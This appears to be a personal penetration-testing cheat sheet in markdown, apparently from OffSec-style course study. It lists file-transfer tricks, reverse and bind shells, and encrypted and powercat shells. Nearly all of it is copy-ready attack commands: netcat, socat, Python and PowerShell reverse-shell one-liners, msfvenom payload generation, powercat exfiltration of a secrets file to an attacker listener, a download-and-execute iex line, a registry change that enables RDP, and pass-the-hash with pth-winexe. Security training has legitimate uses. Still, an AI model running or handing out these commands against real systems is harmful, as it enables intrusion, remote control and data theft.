## File Transfers
- netcat
	- send wget.exe to a nc listener on port 4444:
	`nc -nv {ip-address} 4444 < /usr/share/windows-resources/binaries/wget.exe`
	- receive a file on port 4444 and name it wget.exe:
	`nc -nlvp 4444 > wget.exe`

- socat
	- Share a file called passwords.txt on port 443:
	`sudo socat TCP4-LISTEN:443,fork file:passwords.txt`
	- Receive a file being hosted on port 443 and save it to passwords.txt:
	`socat TCP4:{ip-address}:443 file:passwords.txt,create`

- powershell 
	- `Set-ExecutionPolicy Unrestricted` must be applied beforehand
	- Download wget.exe from a websever (such as a SimpleHTTPServer) :
	 `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{ip-address}/wget.exe','C:\Users\offsec\Desktop\wget.exe')" `

- SMB
	- set up a SMB server on Kali with a share called Tools in the wd
	`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .`
	- copy a file from Kali to Windows
	`copy \\{ip-address}\tools\file.ext file.ext`
	- copy a file from Windows to Kali
	`copy file.ext \\{ip-address}\tools\file.ext`

## Reverse Shells
Victim connnects and attacker listens. Used 95% of the time.

- netcat
	- attacker runs: `nc -nlvp 4444`
	- victim runs: `nc -nv {ip-address} 4444 -e /bin/bash` 

- socat (unencrypted)
	- attacker runs: `sudo socat -d -d  TCP4-LISTEN:4444 STDOUT`
	- victim runs (linux): `socat TCP4:{ip-address}:4444 EXEC:/bin/bash`
	- victim runs (windows): `socat TCP4:{ip-address}:4444 EXEC:cmd.exe,pipes`

- netcat without `-e` or `-c` on victim
	- attacker runs: `nc -nlvp 4444`
	- victim runs: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip-address} 1234 >/tmp/f`

- msfvenom to create reverse shell binaries
	- windows: `msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip-address} LPORT={port} -f exe -o reverse.exe`
	- linux: 
	- attacker can set up a listener with netcat of metasploit's multi/handler

- python
	- attacker runs: `nc -nlvp 4444`
	- victim runs: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("PUT-IP-HERE",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

- powershell
	- attacker runs: `nc -nlvp 443`
	- victim runs on cmd prompt: ```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IP-ADDRESS',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"```
	-  
## Bind Shells
Victim listens and attacker connects. Useful when bypassing firewalls or when reverse shells "just don't work".

- netcat
	- victim runs: `nc -nlvp 4444 -e cmd.exe`
	- attacker runs: `nc -nv 10.11.0.22 4444`

- socat
	- victim runs (linux): `socat -d -d TCP4-LISTEN:4444 EXEC:/bin/bash`
	- victim runs (windows): `socat -d -d TCP4-LISTEN:443 EXEC:cmd.exe,pipes`
	- attacker runs: `socat - TCP4:{ip-address}:4444`

## Encrypted shells with OpenSSL & Socat
Utilize SSL certificates to encrypt data sent between hosts

### Generate the cert
- create an openssl certificate
	- `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 100 -out bind_shell.crt`
- concatenate the certififcate and private key into a .pem file
	- `cat bind_shell.key bind_shell.crt > bind_shell.pem`

### Reverse shell
- attacker socat listener utilizing the cert (linux)
	- `sudo socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork`
- victim socat SSL connection to listener (windows)
	- `socat - OPENSSL:{ip-address}:443,verify=0 EXEC:cmd.exe,pipes`

### Bind Shell
- transfer cert to victim if openssl is not installed locally
- victim socat listener utilizing the cert (windows)
	- `socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork EXEC:cmd.exe,pipes`
- attacker socat SSL connection to listener (linux)
	- `socat - OPENSSL:{ip-address}:443,verify=0`

## Shells with powercat
[powercat](https://github.com/besimorhino/powercat) is basically a powershell version of netcat. 

### Setup
- load powercat into the powershell instance
	- after file transfer from kali: `. .\powercat.ps1`
	- download if the victim has internet access `iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`
	- Scripts loaded in this way will only be available in the current PowerShell instance and will need to be reloaded each time we restart PowerShell.

### powercat file transfers
- exfiltrate secrets from a windows victim to kali
	- attacker listening for files:
		- `sudo nc -nlvp 443 > secrets.txt`
	- victim using powercat
		- `powercat -c {kali-ip} -p 443 -i C:\Users\Offsec\secrets.txt`
	- hangs? had to hit ctrl c on windows, but the file was fine :shrug:

### powercat reverse shell
- attacker runs: `sudo nc -lvp 443`
- victim runs `powercat -c {ip-address} -p 443 -e cmd.exe`

### powercat bind shell
- victim listener runs: `powercat -l -p 443 -e cmd.exe`
- attacker kali runs: `nc -nv {ip-address} 443`

### reverse shell with encoded payload
Powercat can also generate stand-alone payloads. In the context of powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user. You **CANNOT** pass filename to `powershell.exe -E` , must use the encoded string.

- attacker sets up listener `sudo nc -nlvp 443`
- victim creates payload in powershell
```
powercat -c {attacker-ip} -p 443 -e cmd.exe -ge > enc_payload.ps1
```
- victim copies base64 encoded string from enc_payload.ps1 and passes it to `powershell.exe -E` (run from powershell) 
	- `powershell.exe -E {base64-payload}` 
		- this seems super finnicky. don't use double quotes for payload and include any newlines in copy/paste 

### bind shell with encoded payload
Similar to encoded reverse shells, you **CANNOT** pass filename to `powershell.exe -E` , must use the encoded string.
- victim creates encoded bind payload 
	- `powercat -l -p 443 -e cmd.exe -ge > enc_bindpayload.ps1`
- victim runs in powershell the listener `powershell.exe -E {base64-payload}`
	- no quotes, include newlines, had to press enter one extra time after running the command
- attacker connects from kali
	- `nc -nv {victim-ip} 443`

## Shell upgrades
- upgrade a bad shell with pty: `python -c 'import pty; pty.spawn("/bin/bash")'` 

## Other Windows Shell-like options
- RDP
	- Create a regfile.reg file with `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalService` inside
	- `"fDenyTSConnections"=dword:00000000"`
	- `reg import regfile.reg`
	- `net start "termservice"`
	- `sc config termservice start= auto`
	- `net start termservice`
- [PSExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec): a light-weight telnet-replacement that lets you execute processes on other systems
	- `.\PsExec64.exe -accepteula -i -s C:\path\to\reverse.exe` (see msfvenom to create reverse shell binaries)
	- **don't** use this on real client systems! (it leaves artifacts)
- [Winexe](https://tools.kali.org/maintaining-access/winexe): remotely execute commands on Windows from a Linux machine
	- requires creds. If the creds you have are admin, you can use the --system option to spawn a system shell.
	- `winexe -U '{user}%{password}' //{ip-address} cmd.exe`
- Pth-winexe: pass-the-hash version of Winexe
	- `pth-winexe -U '{user}%{LM-hash}:{NTLM-hash}' //{ip-address} cmd.exe`
